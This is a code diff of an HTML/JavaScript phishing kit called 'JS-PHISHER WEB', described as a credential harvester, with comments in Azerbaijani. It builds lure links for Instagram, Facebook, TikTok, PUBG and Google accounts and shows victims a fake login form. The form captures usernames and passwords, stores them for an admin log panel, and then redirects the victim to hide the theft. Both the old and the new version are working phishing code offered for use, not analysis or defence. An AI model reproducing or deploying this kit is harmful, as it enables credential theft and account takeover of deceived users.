@@ -3,179 +3,185 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Analizer - Phish Gen</title>
+    <title>AI Analizer - V.K PhishGen</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap');
-        
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+
         :root {
-            --bg: #0a0a0c;
+            --bg: #0d0d12;
+            --card: #16161e;
             --primary: #ff3e3e;
-            --neon: #00d9ff;
-            --card: #15151a;
+            --accent: #00d9ff;
+            --text: #e4e4e4;
         }
 
         body {
-            margin: 0; background: var(--bg); color: #fff;
-            font-family: 'Fira Code', monospace; display: flex; flex-direction: column; align-items: center;
+            margin: 0; background: var(--bg); color: var(--text);
+            font-family: 'JetBrains Mono', monospace;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }
 
-        .container { width: 95%; max-width: 800px; padding: 20px; }
-
-        /* HEADER */
-        .header { text-align: center; padding: 40px 0; border-bottom: 1px solid #222; }
-        .header h1 { color: var(--primary); letter-spacing: 5px; margin: 0; }
-
-        /* GENERATOR SECTION */
-        .gen-box {
-            background: var(--card); padding: 25px; border-radius: 15px;
-            margin-top: 30px; border: 1px solid #333;
+        .container {
+            width: 90%; max-width: 600px; background: var(--card);
+            border: 1px solid #2a2a35; border-radius: 20px; padding: 30px;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.5);
         }
 
-        input, select {
-            width: 100%; padding: 15px; margin: 10px 0;
-            background: #000; border: 1px solid #444; color: var(--neon);
-            border-radius: 8px; font-family: inherit;
+        .header { text-align: center; border-bottom: 1px solid #2a2a35; padding-bottom: 20px; margin-bottom: 20px; }
+        .header h1 { color: var(--primary); margin: 0; letter-spacing: 3px; font-size: 24px; }
+        .header p { font-size: 10px; opacity: 0.6; margin-top: 5px; }
+
+        .section-title { font-size: 14px; color: var(--accent); margin-bottom: 15px; display: block; }
+
+        select, input {
+            width: 100%; padding: 14px; margin-bottom: 15px;
+            background: #09090d; border: 1px solid #333; border-radius: 10px;
+            color: #fff; outline: none; font-family: inherit;
         }
 
         .btn {
             width: 100%; padding: 15px; background: var(--primary);
-            color: #fff; border: none; border-radius: 8px;
+            color: #fff; border: none; border-radius: 10px;
             font-weight: bold; cursor: pointer; transition: 0.3s;
+            text-transform: uppercase;
         }
 
-        .btn:hover { background: #ff0000; box-shadow: 0 0 20px rgba(255, 62, 62, 0.4); }
+        .btn:hover { background: #d32f2f; box-shadow: 0 0 20px rgba(255, 62, 62, 0.3); }
 
-        /* RESULT LINK */
-        .link-output {
-            background: #000; padding: 15px; border-radius: 8px;
-            margin-top: 20px; display: none; border: 1px dashed var(--neon);
+        #linkDisplay {
+            margin-top: 20px; padding: 15px; background: #000;
+            border: 1px dashed var(--accent); border-radius: 10px;
+            display: none; word-break: break-all; color: var(--accent); font-size: 12px;
         }
 
-        /* VICTIM LOGS */
-        .logs { margin-top: 40px; width: 100%; }
-        .log-card {
-            background: #111; padding: 15px; border-radius: 10px;
-            margin-bottom: 10px; border-left: 5px solid var(--primary);
-            display: flex; justify-content: space-between;
+        .logs-area {
+            margin-top: 30px; max-height: 200px; overflow-y: auto;
+            border-top: 1px solid #2a2a35; padding-top: 20px;
         }
 
-        .status-online { color: #00ff00; font-size: 12px; }
+        .log-item {
+            background: #09090d; padding: 10px; border-radius: 8px;
+            margin-bottom: 10px; border-left: 3px solid var(--primary);
+            font-size: 12px;
+        }
+
+        .log-item b { color: var(--accent); }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div class="container" id="adminPanel">
         <div class="header">
             <h1>JS-PHISHER WEB</h1>
-            <p style="opacity: 0.5;">REAL-TIME CREDENTIAL HARVESTER</p>
+            <p>V.K PROJECT - CREDENTIAL HARVESTER ENGINE</p>
         </div>
 
-        <div class="gen-box">
-            <h3>1. Səhifəni Hazırla</h3>
-            <select id="template">
-                <option value="Instagram">Instagram Login</option>
-                <option value="Facebook">Facebook Security</option>
-                <option value="Gmail">Google Account</option>
-                <option value="PUBG">PUBG Mobile UC Gift</option>
-            </select>
-            <input type="text" id="maskName" placeholder="Maskalanmış Link Adı (məs: free-uc-gift)">
-            <button class="btn" onclick="generatePhish()">LİNKİ GENERASİYA ET</button>
+        <span class="section-title">> Səhifəni Hazırla</span>
+        <select id="targetSite">
+            <option value="Instagram">Instagram</option>
+            <option value="Facebook">Facebook</option>
+            <option value="TikTok">TikTok</option>
+            <option value="PUBG">PUBG Mobile (Gift)</option>
+            <option value="Gmail">Google Account</option>
+        </select>
 
-            <div id="output" class="link-output">
-                <small style="color: var(--neon);">Qurbana göndəriləcək URL:</small><br>
-                <code id="finalUrl"></code>
-            </div>
+        <input type="text" id="customSlug" placeholder="Link sonluğu (məs: pulsuz-uc-qazan)">
+        
+        <button class="btn" onclick="createLink()">LİNKİ GENERASİYA ET</button>
+
+        <div id="linkDisplay">
+            <small>Qurbana göndər:</small><br>
+            <span id="generatedUrl"></span>
         </div>
 
-        <div class="logs">
-            <h3>2. Tutulan Hesablar <span class="status-online">● CANLI</span></h3>
+        <div class="logs-area">
+            <span class="section-title">> Tutulan Məlumatlar</span>
             <div id="logList">
-                <p style="opacity: 0.3; text-align: center;">Hələ ki, məlumat yoxdur...</p>
+                <p style="opacity: 0.3; font-size: 11px; text-align: center;">Hələ ki, məlumat yoxdur...</p>
             </div>
         </div>
     </div>
 
     <script>
-        // Link yaratma funksiyası
-        function generatePhish() {
-            const template = document.getElementById('template').value;
-            const mask = document.getElementById('maskName').value || 'login';
-            const output = document.getElementById('output');
-            const finalUrl = document.getElementById('finalUrl');
+        // 1. Link Yaradılması
+        function createLink() {
+            const site = document.getElementById('targetSite').value;
+            const slug = document.getElementById('customSlug').value || 'login';
+            const display = document.getElementById('linkDisplay');
+            const urlSpan = document.getElementById('generatedUrl');
 
-            // Lokal URL-i yaradırıq (Serverdə olanda real link olacaq)
-            const currentUrl = window.location.href.split('?')[0];
-            const link = `${currentUrl}?target=${template}&ref=${mask}`;
+            // Mövcud URL-ə parametrlər əlavə edirik
+            const finalLink = window.location.href.split('?')[0] + `?view=${site}&ref=${slug}`;
             
-            finalUrl.innerText = link;
-            output.style.display = 'block';
+            urlSpan.innerText = finalLink;
+            display.style.display = 'block';
         }
 
-        // Qurban səhifəsini simulyasiya edən funksiya
-        function checkVictimMode() {
+        // 2. Qurban Görünüşü (Giriş Səhifəsi)
+        function checkMode() {
             const params = new URLSearchParams(window.location.search);
-            const target = params.get('target');
+            const view = params.get('view');
 
-            if (target) {
-                // Əgər linkə qurban giribsə, bütün saytı saxta loginə çevir
+            if (view) {
+                // Əgər linkə qurban giribsə, bütün ekranı dəyiş
                 document.body.innerHTML = `
-                    <div style="background:#fff; color:#000; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif;">
-                        <img src="https://www.instagram.com/static/images/web/mobile_gnl_header_2x.png/93083ad62171.png" width="175">
-                        <form style="display:flex; flex-direction:column; width:300px; margin-top:20px;" onsubmit="handlePhish(event)">
-                            <input type="text" id="u" placeholder="Phone, username or email" style="padding:10px; margin:5px; border:1px solid #dbdbdb; background:#fafafa;" required>
-                            <input type="password" id="p" placeholder="Password" style="padding:10px; margin:5px; border:1px solid #dbdbdb; background:#fafafa;" required>
-                            <button type="submit" style="background:#0095f6; color:#fff; border:none; padding:10px; margin:10px; border-radius:4px; font-weight:bold; cursor:pointer;">Log In</button>
-                        </form>
-                        <p style="color:#385185; font-weight:bold; font-size:14px;">Log in with Facebook</p>
+                    <div style="background:#fafafa; color:#262626; height:100vh; width:100%; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family: sans-serif;">
+                        <div style="background:#fff; border:1px solid #dbdbdb; padding:40px; width:350px; text-align:center;">
+                            <h2 style="font-style: italic; font-size: 32px; margin-bottom:20px;">${view}</h2>
+                            <form onsubmit="captureData(event, '${view}')">
+                                <input type="text" id="email" placeholder="Telefon, istifadəçi adı və ya email" style="width:100%; padding:10px; margin-bottom:8px; border:1px solid #dbdbdb; border-radius:3px; background:#fafafa;" required>
+                                <input type="password" id="pass" placeholder="Şifrə" style="width:100%; padding:10px; margin-bottom:12px; border:1px solid #dbdbdb; border-radius:3px; background:#fafafa;" required>
+                                <button type="submit" style="width:100%; background:#0095f6; color:#fff; border:none; padding:8px; border-radius:4px; font-weight:bold; cursor:pointer;">Daxil ol</button>
+                            </form>
+                        </div>
                     </div>
                 `;
             }
         }
 
-        // Hesabı tutub bazaya yazan funksiya
-        function handlePhish(e) {
+        // 3. Məlumatın Tutulması
+        function captureData(e, site) {
             e.preventDefault();
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-            const target = new URLSearchParams(window.location.search).get('target');
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
 
-            const log = {
-                target: target,
-                user: user,
+            const data = {
+                site: site,
+                user: email,
                 pass: pass,
                 time: new Date().toLocaleTimeString()
             };
 
-            // Baza (LocalStorage) - Realda Firebase və ya MySQL olar
-            let db = JSON.parse(localStorage.getItem('logs') || "[]");
-            db.push(log);
-            localStorage.setItem('logs', JSON.stringify(db));
+            // Məlumatı brauzer yaddaşına atırıq
+            let logs = JSON.parse(localStorage.getItem('phish_logs') || "[]");
+            logs.push(data);
+            localStorage.setItem('phish_logs', JSON.stringify(logs));
 
-            // Qurbanı real sayta atırıq
-            window.location.href = "https://instagram.com";
+            // Qurbanı aldatmaq üçün yönləndirmə
+            window.location.href = "https://www.google.com";
         }
 
-        // Admin üçün loqları göstərən funksiya
-        function updateLogs() {
+        // 4. Admin Panelində Loqları Yeniləmə
+        function refreshLogs() {
             const list = document.getElementById('logList');
-            const db = JSON.parse(localStorage.getItem('logs') || "[]");
+            if(!list) return;
 
-            if (db.length > 0 && list) {
-                list.innerHTML = db.reverse().map(item => `
-                    <div class="log-card">
-                        <div>
-                            <b style="color:var(--neon)">[${item.target}]</b> ${item.user}<br>
-                            <span style="color:#ff3e3e">Şifrə: ${item.pass}</span>
-                        </div>
-                        <div style="font-size:10px; opacity:0.5">${item.time}</div>
+            let logs = JSON.parse(localStorage.getItem('phish_logs') || "[]");
+            
+            if (logs.length > 0) {
+                list.innerHTML = logs.reverse().map(item => `
+                    <div class="log-item">
+                        <b>[${item.site}]</b> User: ${item.user} <br>
+                        <span style="color:#ff3e3e">Pass: ${item.pass}</span> 
+                        <div style="font-size:9px; opacity:0.5; text-align:right;">${item.time}</div>
                     </div>
                 `).join('');
             }
         }
 
         // Başlat
-        checkVictimMode();
-        setInterval(updateLogs, 2000);
+        checkMode();
+        setInterval(refreshLogs, 2000);
     </script>
 </body>
 </html>
